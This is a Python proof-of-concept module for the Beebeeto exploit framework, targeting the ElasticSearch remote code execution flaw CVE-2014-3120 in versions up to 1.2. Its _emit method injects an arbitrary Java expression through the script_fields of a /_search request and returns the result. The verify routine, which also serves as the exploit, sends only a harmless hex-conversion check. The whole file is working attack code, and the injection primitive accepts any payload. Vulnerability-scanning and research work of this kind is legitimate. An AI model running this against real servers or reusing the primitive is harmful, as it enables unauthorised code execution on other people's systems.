#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2
try:
    import simplejson as json
except ImportError:
    import json
import socket
from baseframe import BaseFrame
from utils.http import ForgeHeaders

socket.setdefaulttimeout(5)

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0028',  # 由Beebeeto官方编辑
            'name': 'ElasticSearch 远程代码执行漏洞 POC',  # 名称
            'author': 'e3rp4y',  # 作者
            'create_date': '2014-09-25',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [9200],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ElasticSearch',  # 漏洞所涉及的应用名称
            'vul_version': ['<=1.2'],  # 受漏洞影响的应用版本
            'type': 'Code Execution',  # 漏洞类型
            'tag': ['ElasticSearch', 'remote code execution', 'java'],  # 漏洞相关tag
            'desc': 'ElasticSearch 远程代码执行漏洞.',  # 漏洞描述
            'references': [
                'http://www.ipuman.com/pm6/137/',
                'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3120',
                'http://www.freebuf.com/tools/38025.html' # 参考链接
            ],
        },
    }

    @classmethod
    def _emit(cls, args, exp):
        data = {
            'size': 1,
            'query': {
                'filtered': {
                    'query': {
                        'match_all': {}
                    }
                }
            },
            'script_fields': {
                'task': {  # you can call the task any name, such as 'biubiubiu' etc.
                    'script': exp
                }
            }
        }
        payload = json.dumps(data)
        headers = ForgeHeaders().get_headers()
        headers['Content-Type'] = 'application/json; charset=utf-8'
        headers['Accept'] = 'ext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        url = args['options']['target'] + '/_search?source'
        req = urllib2.Request(url, data=payload, headers=headers)
        resp = urllib2.urlopen(req)
        if resp.getcode() != 200 or \
           'application/json' not in resp.headers.get('content-type'):
            return None
        else:
            ret = json.loads(resp.read())
            return ret['hits']['hits'][0]['fields']['task'][0]

    @classmethod
    def verify(cls, args):
        rs = cls._emit(args, 'Integer.toHexString(65535)')
        if rs == 'ffff':
            url = args['options']['target'] + '/_search?source'
            args['success'] = True
            args['poc_ret']['vul_url'] = url
            if args['options']['verbose']:
                print '[*] {} is vulnerable'.format(args['options']['target'])
        else:
            if args['options']['verbose']:
                print '[*] {} is not vulnerable'.format(args['options']['target'])
            args['success'] = False

        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())